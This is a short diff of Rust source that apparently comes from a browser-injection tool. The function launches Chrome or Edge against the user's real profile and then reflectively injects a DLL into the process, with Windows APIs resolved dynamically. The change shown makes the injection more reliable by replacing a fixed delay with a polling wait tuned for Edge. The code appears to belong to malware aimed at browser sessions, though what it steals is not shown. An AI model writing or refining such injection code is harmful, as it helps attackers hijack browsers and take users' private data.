@@ -463,7 +463,16 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         if cp_ok == 0 { return Err(()); }
         let pid = pi.dwProcessId;
 
-        std::thread::sleep(std::time::Duration::from_millis(3000));
+        // Edge needs more startup time than Chrome — poll with early exit
+        let wait_ms = if exe_name.eq_ignore_ascii_case("msedge.exe") { 5000u64 } else { 3000u64 };
+        let step = 500u64;
+        let mut elapsed = 0u64;
+        while elapsed < wait_ms {
+            std::thread::sleep(std::time::Duration::from_millis(step));
+            elapsed += step;
+            // If the process already exited, no point waiting further
+            if dynapi::WaitForSingleObject(pi.hProcess, 0) == 0 { break; }
+        }
         let dll_bytes = fs::read(dll_path).unwrap_or_default();
         if dll_bytes.is_empty() { dynapi::CloseHandle(pi.hThread); dynapi::CloseHandle(pi.hProcess); return Err(()); }
         let result = inject_dll_reflective_with_handle(pi.hProcess, &dll_bytes);
